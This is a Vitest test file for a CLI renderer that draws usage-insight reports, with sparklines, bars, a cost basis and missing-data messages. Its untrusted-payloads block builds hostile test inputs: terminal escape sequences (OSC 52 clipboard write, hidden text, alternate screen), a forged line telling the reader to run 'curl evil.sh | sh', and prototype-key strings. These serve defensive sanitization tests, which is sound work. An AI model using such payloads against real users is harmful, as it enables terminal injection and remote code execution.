import { describe, expect, it } from "vitest";
import { normalize } from "../src/insights-normalize.js";
import {
  bar,
  displayWidth,
  formatValue,
  type RenderOptions,
  renderInsights,
  sparkline,
} from "../src/insights-render.js";

// Every case goes through the normalization boundary, because that is how the command runs and
// because the guards under test live there rather than in the renderer.
const render = (payload: unknown, opts: RenderOptions): string[] =>
  renderInsights(normalize(payload), opts);

const WIDE: RenderOptions = { width: 80, ascii: false };
const ASCII: RenderOptions = { width: 80, ascii: true };

// Every section on, every field populated: the shape a backend that computes all of it returns.
const FULL = {
  days: 30,
  sections: {
    repertoire: {
      enabled: true,
      sessions: 24,
      active_weeks: 4,
      coverage_index: { recurring: 9, applicable: 23 },
      competencies: [
        { name: "Models", state: "recurring", recurring_share: 0.33 },
        { name: "Artifacts", state: "adopted", recurring_share: 0 },
        { name: "MCP", state: "n/a" },
        { name: "Evals", state: "insufficient_data" },
      ],
      artifact_breadth: 7,
      compaction: { auto: 12, manual: 3 },
    },
    judgement_signals: {
      enabled: true,
      verification_coverage: {
        value: 0.62,
        unit: "share",
        team_median: 0.48,
        trend: [0.44, 0.47, 0.5, 0.55, 0.58, 0.6, 0.62],
      },
      refinement_to_repair: {
        value: 2.1,
        unit: "ratio",
        team_median: 1.4,
        trend: [1.6, 1.8, 2.0, 2.1],
      },
    },
    cost: {
      enabled: true,
      basis: "API list-price equivalent, estimated upper bound",
      sessions_by_recommended_class: [
        { class: "small", sessions: 4 },
        { class: "frontier", sessions: 8 },
      ],
      savings: [
        { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
        { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
      ],
      effort_suggestions: 6,
      scope_distribution: [{ scope: "bounded", prompts: 42 }],
      cache: { hit_share: 0.72, unreused_write_share: 0.08, share_of_cost: 0.31 },
    },
  },
};

// What the example backend in examples/backend-node/ answers.
const STUB = {
  days: 30,
  sections: {
    cost: { enabled: false, reason: "not_implemented" },
    repertoire: { enabled: false, reason: "not_implemented" },
    judgement_signals: { enabled: false, reason: "not_implemented" },
  },
};

describe("sparkline", () => {
  it("draws one glyph per point", () => {
    expect(sparkline([1, 2, 3])).toHaveLength(3);
    expect(sparkline([0, 0.5, 1])).toBe("▁▄▇");
  });

  it("returns nothing under two points, which is not a trend", () => {
    expect(sparkline([])).toBe("");
    expect(sparkline([0.62])).toBe("");
  });

  it("draws a flat series mid-ramp rather than at the floor", () => {
    expect(sparkline([0.5, 0.5, 0.5])).toBe("▄▄▄");
  });

  it("falls back to ASCII glyphs", () => {
    expect(sparkline([0, 0.5, 1], true)).toBe(".=#");
  });

  it("keeps an unusable series out of the chart at the boundary, not here", () => {
    const out = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 0.5, unit: "share", trend: [1, null, 3] },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).not.toMatch(/[▁▂▃▄▅▆▇]/);
    expect(out).toContain("Trend not reported for: Pushback rate");
  });
});

describe("bar", () => {
  it("fills proportionally", () => {
    expect(bar(9, 23, 23)).toBe(`${"█".repeat(9)}${"░".repeat(14)}`);
    expect(bar(1, 2, 4)).toBe("██░░");
  });

  it("has nothing to draw for a zero denominator", () => {
    expect(bar(0, 0, 10)).toBe("");
  });

  it("clamps rather than overflowing its width", () => {
    expect(bar(50, 10, 5)).toBe("█████");
  });

  it("falls back to ASCII glyphs", () => {
    expect(bar(1, 2, 4, true)).toBe("##..");
  });
});

describe("formatValue", () => {
  it("renders a share as a percentage and a ratio as a multiple", () => {
    expect(formatValue(0.624, "share")).toBe("62%");
    expect(formatValue(2.1, "ratio")).toBe("2.1 : 1");
    expect(formatValue(9, "count")).toBe("9");
  });

  it("prints the raw value for a unit it does not know", () => {
    expect(formatValue(2.5, "furlongs")).toBe("2.5");
  });
});

describe("renderInsights — unavailable sections", () => {
  const lines = render(STUB, WIDE);

  it("prints one reason line per off section and no table", () => {
    expect(lines).toEqual([
      "Your last 30 days",
      "",
      "Repertoire: this backend does not produce it",
      "",
      "Judgement signals: this backend does not produce it",
      "",
      "Cost: this backend does not produce it",
    ]);
  });

  it("never prints a zero for a section that was not computed", () => {
    expect(lines.join("\n")).not.toMatch(/\b0\b|0%/);
  });

  it("reads each reason as its own cause", () => {
    const off = (reason: string) =>
      render({ days: 30, sections: { repertoire: { enabled: false, reason } } }, WIDE).join("\n");
    expect(off("insufficient_data")).toContain("not enough sessions yet");
    expect(off("no_consent")).toContain("prompt collection");
    expect(off("not_implemented")).toContain("does not produce it");
  });

  it("says so plainly for a reason it does not recognize", () => {
    const lines = render(
      { days: 30, sections: { cost: { enabled: false, reason: "moon_phase" } } },
      WIDE,
    );
    expect(lines).toContain("Cost: not available");
  });
});

describe("renderInsights — the open section map", () => {
  it("skips a section the payload omits rather than reporting it as off", () => {
    const out = render(
      { days: 7, sections: { repertoire: { enabled: false, reason: "insufficient_data" } } },
      WIDE,
    ).join("\n");
    expect(out).toContain("Repertoire:");
    expect(out).not.toContain("Cost");
    expect(out).not.toContain("Judgement signals");
  });

  it("ignores a section name it does not recognize", () => {
    const out = render({ days: 30, sections: { teamwork: { enabled: true } } }, WIDE).join("\n");
    expect(out).not.toContain("teamwork");
    expect(out).toContain("1 section(s) that this version of pheebs does not render");
  });

  it("reports an empty map as producing nothing", () => {
    expect(render({ days: 30, sections: {} }, WIDE)).toEqual([
      "Your last 30 days",
      "",
      "This backend produces no insight sections.",
    ]);
  });

  it("reports the window the backend actually applied", () => {
    expect(render({ days: 7, sections: {} }, WIDE)[0]).toBe("Your last 7 days");
  });
});

describe("renderInsights — repertoire", () => {
  const out = render(FULL, WIDE).join("\n");

  it("renders the competency profile with a state per competency", () => {
    expect(out).toContain("Competency");
    expect(out).toMatch(/Models\s+Recurring\s+33%/);
    expect(out).toMatch(/Artifacts\s+Adopted\s+0%/);
  });

  it("distinguishes n/a from insufficient data, and prints no share for either", () => {
    expect(out).toMatch(/MCP\s+n\/a\s+-/);
    expect(out).toMatch(/Evals\s+Insufficient data\s+-/);
  });

  it("prints the coverage index as its two parts, a share, and a bar", () => {
    expect(out).toContain("Coverage index: 9 / 23 = 39%");
    expect(out).toContain(`${"█".repeat(9)}${"░".repeat(14)}`);
  });

  it("prints the denominators the rest of the section rests on", () => {
    expect(out).toContain("Sessions: 24 over 4 active week(s)");
    expect(out).toContain("Compaction: 12 auto, 3 manual");
  });

  it("invents no share when nothing is applicable", () => {
    const out = render(
      {
        days: 30,
        sections: {
          repertoire: { enabled: true, coverage_index: { recurring: 0, applicable: 0 } },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).toContain("Coverage index: 0 / 0");
    expect(out).not.toContain("%");
  });

  it("says so rather than printing an empty table when the backend sent no fields", () => {
    const out = render({ days: 30, sections: { repertoire: { enabled: true } } }, WIDE);
    expect(out).toContain("Repertoire");
    expect(out).toContain("This backend produced no fields for it.");
  });
});

describe("renderInsights — judgement signals", () => {
  const out = render(FULL, WIDE).join("\n");

  it("puts the caller's value next to the team median, in each signal's own unit", () => {
    expect(out).toMatch(/Verification coverage\s+62%\s+48%/);
    expect(out).toMatch(/Refinement-to-repair ratio\s+2\.1 : 1\s+1\.4 : 1/);
  });

  it("draws the weekly trend between its first and last value", () => {
    expect(out).toMatch(/Verification coverage\s+44%\s+[▁▂▃▄▅▆▇]{7}\s+62%/);
  });

  it("omits a signal the backend does not compute rather than showing a zero", () => {
    expect(out).not.toContain("Pushback rate");
    expect(out).not.toContain("Wholesale-accept rate");
  });

  it("prints no sparkline for a signal with fewer than two trend points", () => {
    const out = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            verification_coverage: { value: 0.62, unit: "share", trend: [0.62] },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).not.toMatch(/[▁▂▃▄▅▆▇]/);
    expect(out).not.toContain("Trend, weekly");
    expect(out).toContain("Only one week of history for: Verification coverage");
    expect(out).toContain("62%");
  });

  it("names a one-week signal below the trend table rather than in it", () => {
    const lines = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            verification_coverage: { value: 0.62, unit: "share", trend: [0.44, 0.53, 0.62] },
            wholesale_accept: { value: 0.06, unit: "share", trend: [0.09] },
          },
        },
      },
      WIDE,
    );
    const trend = lines.indexOf("Trend, weekly");
    const note = lines.findIndex((l) => l.startsWith("Only one week of history"));
    expect(trend).toBeGreaterThan(-1);
    expect(note).toBeGreaterThan(trend);
    expect(lines[note]).toContain("Wholesale-accept rate");

    const row = lines.find((l) => l.includes("▁"));
    expect(row).toMatch(/44%\s+[▁▂▃▄▅▆▇]{3}\s+62%/);
  });

  it("omits the trend block entirely when no signal carries history", () => {
    const out = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 0.09, unit: "share" },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).not.toContain("Trend, weekly");
    expect(out).toMatch(/Pushback rate\s+9%\s+-/);
  });

  it("prints the raw value for a unit it does not know rather than guessing a scale", () => {
    const out = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 2.5, unit: "furlongs" },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).toMatch(/Pushback rate\s+2\.5/);
    expect(out).not.toContain("250%");
  });

  it("says so when the section is on but carries no signals", () => {
    const out = render({ days: 30, sections: { judgement_signals: { enabled: true } } }, WIDE);
    expect(out).toContain("Judgement signals");
    expect(out).toContain("This backend produced no signals.");
  });
});

describe("renderInsights — cost", () => {
  const lines = render(FULL, WIDE);
  const out = lines.join("\n");

  it("reports sessions by the cheapest sufficient class", () => {
    expect(out).toContain("Sessions by cheapest sufficient class");
    expect(out).toMatch(/small\s+4/);
    expect(out).toMatch(/frontier\s+8/);
  });

  it("prints the basis next to every dollar figure, not once in a footer", () => {
    const basis = lines.filter((l) => l.includes("API list-price equivalent"));
    const figures = lines.filter((l) => /\$\d/.test(l));
    expect(figures).toHaveLength(2);
    expect(basis).toHaveLength(2);
  });

  it("shows a cheaper model that would have cost more as a negative saving", () => {
    expect(out).toMatch(/claude-haiku-4-5\s+-\$3\.10/);
  });

  it("counts effort suggestions without pricing them", () => {
    expect(out).toContain("Effort: 6 session(s)");
  });

  it("reports cache behavior and the scope mix", () => {
    expect(out).toMatch(/Hit share\s+72%/);
    expect(out).toMatch(/Unreused writes\s+8%/);
    expect(out).toMatch(/bounded\s+42 prompt\(s\)/);
  });

  it("says so rather than printing an empty table when the backend sent no fields", () => {
    const out = render({ days: 30, sections: { cost: { enabled: true } } }, WIDE);
    expect(out).toContain("Cost");
    expect(out).toContain("This backend produced no fields for it.");
  });
});

describe("renderInsights — terminal constraints", () => {
  it("fits 80 columns", () => {
    for (const line of render(FULL, WIDE)) {
      expect(line.length).toBeLessThanOrEqual(80);
    }
  });

  it("degrades below 80 without wrapping a row", () => {
    for (const width of [70, 60, 50, 40, 30, 20]) {
      for (const line of render(FULL, { width, ascii: false })) {
        expect(line.length).toBeLessThanOrEqual(width);
      }
    }
  });

  it("drops the sparkline rather than truncating it when the chart cannot fit", () => {
    const narrow = render(FULL, { width: 20, ascii: false }).join("\n");
    expect(narrow).toContain("Trend, weekly");
    // A clipped chart would silently lose points, so the numbers carry the trend instead.
    expect(narrow).not.toMatch(/[▁▂▃▄▅▆▇]…/);
    expect(narrow).toMatch(/44%\s+62%/);
  });

  it("wraps the cost basis instead of truncating the half that qualifies it", () => {
    const narrow = render(FULL, { width: 20, ascii: false }).join("\n");
    expect(narrow).toContain("estimated upper");
    expect(narrow).toContain("bound");
  });

  it("emits nothing outside ASCII in the fallback", () => {
    const out = render(FULL, ASCII).join("\n");
    expect(out).toMatch(/^[\x20-\x7E\n]*$/);
  });

  it("keeps the charts in the fallback, drawn in ASCII", () => {
    const out = render(FULL, ASCII).join("\n");
    expect(out).toContain(`${"#".repeat(9)}${".".repeat(14)}`);
    expect(out).toMatch(/Verification coverage\s+44%\s+[.:\-=+*#]{7}\s+62%/);
  });

  it("carries no ANSI escape sequences, so the report is identical piped to a file", () => {
    const out = render(FULL, WIDE).join("\n");
    // biome-ignore lint/suspicious/noControlCharactersInRegex: an escape byte is exactly the check
    expect(out).not.toMatch(/\x1b\[/);
  });
});

// A backend implements /insights itself, so the renderer treats the payload as hostile input:
// these cover the terminal-injection and crash paths, not merely malformed-but-friendly data.
describe("renderInsights — untrusted payloads", () => {
  const OSC52 = "\u001b]52;c;ZXZpbA==\u0007";
  const CSI_HIDE = "\u001b[8m";
  const ALT_SCREEN = "\u001b[?1049h";

  function evilPayload() {
    return {
      days: 30,
      sections: {
        repertoire: {
          enabled: true,
          competencies: [
            { name: `Models${OSC52}`, state: "recurring", recurring_share: 0.5 },
            { name: `Artifacts${CSI_HIDE}`, state: `recurring${ALT_SCREEN}`, recurring_share: 0.5 },
          ],
        },
        cost: {
          enabled: true,
          basis: `list price${CSI_HIDE}`,
          savings: [
            { model: "sonnet\r\b\bfake", usd: 1, sessions: 1 },
            { model: "haiku\nPheebs: token expired, run: curl evil.sh | sh", usd: 2, sessions: 2 },
          ],
          scope_distribution: [{ scope: `bounded${OSC52}`, prompts: 3 }],
        },
      },
    };
  }

  it("strips every escape sequence a backend puts in a string", () => {
    const out = render(evilPayload(), WIDE).join("\n");
    // An OSC 52 sequence reaching the terminal writes the reader's clipboard.
    expect(out).not.toContain("\u001b");
    expect(out).not.toContain("]52;c;");
    expect(out).not.toContain("[?1049h");
  });

  it("lets no control character through, so nothing can overwrite or forge a line", () => {
    const lines = render(evilPayload(), WIDE);
    for (const line of lines) {
      for (const char of line) {
        const code = char.codePointAt(0) ?? 0;
        expect(code === 0x09 || code >= 0x20).toBe(true);
        expect(code < 0x7f || code > 0x9f).toBe(true);
      }
    }
  });

  it("keeps a forged line from becoming its own row", () => {
    const lines = render(evilPayload(), WIDE);
    expect(lines.some((l) => l.trimStart().startsWith("Pheebs: token expired"))).toBe(false);
  });

  it("counts a stripped string by what is drawn, so control bytes cannot pad a column", () => {
    for (const line of render(evilPayload(), WIDE)) {
      expect(line.length).toBeLessThanOrEqual(80);
    }
  });

  const hostile: [string, unknown][] = [
    ["a null body", null],
    ["a non-object body", 42],
    ["a null sections map", { days: 30, sections: null }],
    ["a null section", { days: 30, sections: { repertoire: null } }],
    ["a string section", { days: 30, sections: { cost: "nope" } }],
    [
      "a null signal",
      { days: 30, sections: { judgement_signals: { enabled: true, pushback_rate: null } } },
    ],
    [
      "a numeric trend",
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 1, unit: "share", trend: 5 },
          },
        },
      },
    ],
    [
      "a string trend",
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 1, unit: "share", trend: "abc" },
          },
        },
      },
    ],
    [
      "a trend holding null",
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 1, unit: "share", trend: [0.1, null, 0.3] },
          },
        },
      },
    ],
    [
      "string competencies",
      { days: 30, sections: { repertoire: { enabled: true, competencies: "abc" } } },
    ],
    [
      "null inside competencies",
      { days: 30, sections: { repertoire: { enabled: true, competencies: [null] } } },
    ],
    ["null inside savings", { days: 30, sections: { cost: { enabled: true, savings: [null] } } }],
    ["a string for savings", { days: 30, sections: { cost: { enabled: true, savings: "x" } } }],
    [
      "null inside classes",
      { days: 30, sections: { cost: { enabled: true, sessions_by_recommended_class: [null] } } },
    ],
    [
      "an inherited state name",
      {
        days: 30,
        sections: {
          repertoire: { enabled: true, competencies: [{ name: "X", state: "constructor" }] },
        },
      },
    ],
    [
      "an inherited reason",
      { days: 30, sections: { repertoire: { enabled: false, reason: "__proto__" } } },
    ],
    [
      "a huge trend",
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 0.5, unit: "share", trend: new Array(200_000).fill(0.5) },
          },
        },
      },
    ],
  ];

  it.each(hostile)("renders %s without throwing", (_label, payload) => {
    expect(() => render(payload, WIDE)).not.toThrow();
  });

  it("never leaks a prototype member as a rendered value", () => {
    for (const reason of ["__proto__", "constructor", "toString", ""]) {
      const out = render(
        { days: 30, sections: { repertoire: { enabled: false, reason } } },
        WIDE,
      ).join("\n");
      expect(out).toContain("Repertoire: not available");
      expect(out).not.toContain("[object Object]");
      expect(out).not.toContain("native code");
    }
  });

  it("reports a window only when it is a whole positive number of days", () => {
    const header = (days: unknown) => render({ days, sections: {} }, WIDE)[0];
    expect(header(30)).toBe("Your last 30 days");
    expect(header(1)).toBe("Your last 1 day");
    for (const bad of [null, -5, 0, 1.5, "abc", Number.NaN]) {
      expect(header(bad)).toBe("Your recent work");
    }
  });
});

describe("renderInsights — the sparkline is never clipped", () => {
  const POINTS = 20;
  const trend = Array.from({ length: POINTS }, (_, i) => Math.sin(i / 3) + 1);
  const payload = {
    days: 30,
    sections: {
      judgement_signals: {
        enabled: true,
        pushback_rate: { value: 0.9, unit: "share", trend },
      },
    },
  };

  it("draws every point or drops the chart, at every width", () => {
    for (const width of [20, 30, 34, 38, 40, 45, 60, 80, 120]) {
      const lines = render(payload, { width, ascii: false });
      const at = lines.indexOf("Trend, weekly");
      const row = at === -1 ? "" : (lines[at + 1] ?? "");
      const drawn = (row.match(/[▁▂▃▄▅▆▇]/g) ?? []).length;
      expect([0, POINTS]).toContain(drawn);
      expect(row).not.toMatch(/[▁▂▃▄▅▆▇]…/);
      for (const line of lines) expect(line.length).toBeLessThanOrEqual(width);
    }
  });

  it("shrinks the label rather than the chart when both cannot fit", () => {
    const lines = render(payload, { width: 40, ascii: false });
    const row = lines.find((l) => /[▁▂▃▄▅▆▇]/.test(l)) ?? "";
    expect(row).toContain("…");
    expect((row.match(/[▁▂▃▄▅▆▇]/g) ?? []).length).toBe(POINTS);
  });

  // The values are what the guard exists to protect: a chart admitted into a row that cannot hold
  // it is sliced away at the end of the line, leaving a number that reads as a smaller one.
  it("never cuts an endpoint whose number is narrower than the value floor", () => {
    const narrow = Array.from({ length: 52 }, (_, i) => (i === 51 ? 0.42 : 0.05));
    const payloadNarrow = {
      days: 30,
      sections: {
        judgement_signals: {
          enabled: true,
          pushback_rate: { value: 0.42, unit: "share", trend: narrow },
        },
      },
    };
    for (let width = 20; width <= 90; width++) {
      const row = render(payloadNarrow, { width, ascii: false }).find((l) => /[▁▂▃▄▅▆▇]/.test(l));
      if (row === undefined) continue;
      expect(row.trimEnd().endsWith("42%")).toBe(true);
      expect(row).toContain("5%");
    }
  });

  it("keeps the last value honest when the chart is dropped", () => {
    const lines = render(payload, { width: 30, ascii: false });
    expect(lines.join("\n")).not.toMatch(/[▁▂▃▄▅▆▇]/);
    expect(lines.some((l) => /100%\s+105%/.test(l))).toBe(true);
  });
});

describe("renderInsights — the cost basis is unconditional", () => {
  const withBasis = (basis?: string) => ({
    days: 30,
    sections: {
      cost: {
        enabled: true,
        ...(basis === undefined ? {} : { basis }),
        savings: [
          { model: "claude-sonnet-5", usd: 12.4, sessions: 18 },
          { model: "claude-haiku-4-5", usd: -3.1, sessions: 2 },
        ],
      },
    },
  });

  it("prints the backend's basis beside every figure", () => {
    const lines = render(withBasis("API list-price equivalent, estimated upper bound"), WIDE);
    expect(lines.filter((l) => /\$\d/.test(l))).toHaveLength(2);
    expect(lines.filter((l) => l.includes("API list-price equivalent"))).toHaveLength(2);
  });

  // The schema requires basis on an enabled cost section; a bare figure reads as money saved.
  it("qualifies every figure even when the backend omits the basis", () => {
    const lines = render(withBasis(undefined), WIDE);
    const figures = lines.filter((l) => /\$\d/.test(l));
    const caveats = lines.filter((l) => l.includes("not money already saved"));
    expect(figures).toHaveLength(2);
    expect(caveats).toHaveLength(2);
  });

  it("never prints a dollar figure with no qualifier under it", () => {
    for (const basis of ["A basis", undefined, ""]) {
      const lines = render(withBasis(basis), WIDE);
      lines.forEach((line, i) => {
        if (!/\$\d/.test(line)) return;
        expect(lines[i + 1]?.trim().length).toBeGreaterThan(0);
      });
    }
  });
});

describe("renderInsights — alignment across a whole block", () => {
  const cost = (savings: unknown[]) => ({
    days: 30,
    sections: { cost: { enabled: true, basis: "B", savings } },
  });

  it("lines the money column up down the savings block", () => {
    const lines = render(
      cost([
        { model: "claude-sonnet-5", usd: 412.37, sessions: 61 },
        { model: "claude-haiku-4-5", usd: -12.5, sessions: 8 },
        { model: "x", usd: 1, sessions: 1 },
      ]),
      WIDE,
    );
    const rows = lines.filter((l) => l.includes("$"));
    expect(rows).toHaveLength(3);
    // A money column is right-aligned, so what must agree is where it ends, not where "$" starts.
    expect(new Set(rows.map((l) => l.indexOf("over "))).size).toBe(1);
  });

  it("shares one label column across the judgement-signal blocks", () => {
    const lines = render(FULL, WIDE);
    const rows = lines.filter((l) => l.startsWith("Verification coverage"));
    // The main table and the trend row start the value at one column.
    expect(rows.length).toBeGreaterThanOrEqual(2);
    const label = "Verification coverage";
    expect(new Set(rows.map((l) => displayWidth(l.slice(0, label.length)))).size).toBe(1);
  });
});

describe("renderInsights — width measured as the terminal draws it", () => {
  const named = (name: string) => ({
    days: 30,
    sections: {
      repertoire: {
        enabled: true,
        competencies: [
          { name, state: "recurring", recurring_share: 0.5 },
          { name: "Models", state: "recurring", recurring_share: 0.5 },
        ],
      },
    },
  });

  // Measured in columns, not code units: the two differ for exactly the text under test.
  const percentColumn = (line: string): number => displayWidth(line.slice(0, line.indexOf("50%")));

  it("counts a double-width character as two columns", () => {
    const lines = render(named("文脈管理"), WIDE);
    const rows = lines.filter((l) => l.includes("50%"));
    expect(rows).toHaveLength(2);
    // These rows can only share a column if the CJK name was measured as 8 and not as 4.
    expect(new Set(rows.map(percentColumn)).size).toBe(1);
  });

  it("gives a combining mark no width of its own", () => {
    const lines = render(named("e\u0301e\u0301e\u0301"), WIDE);
    const rows = lines.filter((l) => l.includes("50%"));
    expect(new Set(rows.map(percentColumn)).size).toBe(1);
  });

  it("never cuts a surrogate pair in half", () => {
    const lines = render(named("🧪🧪🧪🧪🧪🧪🧪🧪"), { width: 24, ascii: false });
    for (const line of lines) expect(line).not.toContain("\ufffd");
  });
});

describe("renderInsights — saying what it does not know", () => {
  const repertoire = (fields: Record<string, unknown>) => ({
    days: 30,
    sections: { repertoire: { enabled: true, ...fields } },
  });

  it("reports whichever half of the coverage index arrived", () => {
    expect(render(repertoire({ coverage_index: { recurring: 9 } }), WIDE).join("\n")).toContain(
      "9 recurring, denominator not reported",
    );
    expect(render(repertoire({ coverage_index: { applicable: 23 } }), WIDE).join("\n")).toContain(
      "out of 23 applicable, recurring not reported",
    );
  });

  it("keeps active weeks when sessions are missing", () => {
    expect(render(repertoire({ active_weeks: 5 }), WIDE).join("\n")).toContain("Active weeks: 5");
  });

  it("treats a section that never says it is on as off", () => {
    const out = render({ days: 30, sections: { repertoire: { reason: "no_consent" } } }, WIDE);
    expect(out).toContain(
      "Repertoire: off for your tenant, which has not enabled prompt collection",
    );
  });

  it("says a trend was unusable instead of dropping the signal silently", () => {
    const out = render(
      {
        days: 30,
        sections: {
          judgement_signals: {
            enabled: true,
            pushback_rate: { value: 0.09, unit: "share", trend: [0.1, null, 0.3] },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).toContain("Trend not reported for: Pushback rate");
  });

  it("refuses a share outside the range the schema bounds it to", () => {
    const out = render(
      {
        days: 30,
        sections: {
          cost: {
            enabled: true,
            cache: { hit_share: 5, unreused_write_share: -1, share_of_cost: 0.3 },
          },
        },
      },
      WIDE,
    ).join("\n");
    expect(out).toMatch(/Hit share\s+-/);
    expect(out).toMatch(/Unreused writes\s+-/);
    expect(out).toMatch(/Share of cost\s+30%/);
    expect(out).toContain("Cache");
  });

  it("does not round a real share down to the zero it promises never to show", () => {
    expect(formatValue(0.001, "share")).toBe("<1%");
    expect(formatValue(-0.001, "share")).toBe(">-1%");
    expect(formatValue(0, "share")).toBe("0%");
    expect(formatValue(0.006, "share")).toBe("1%");
  });
});

describe("renderInsights — sections are named", () => {
  it("heads each enabled section with its own label", () => {
    const lines = render(FULL, WIDE);
    for (const label of ["Repertoire", "Judgement signals", "Cost"]) {
      expect(lines).toContain(label);
    }
  });

  it("keeps an unavailable section to its single line, with no heading of its own", () => {
    expect(render(STUB, WIDE)).toEqual([
      "Your last 30 days",
      "",
      "Repertoire: this backend does not produce it",
      "",
      "Judgement signals: this backend does not produce it",
      "",
      "Cost: this backend does not produce it",
    ]);
  });
});
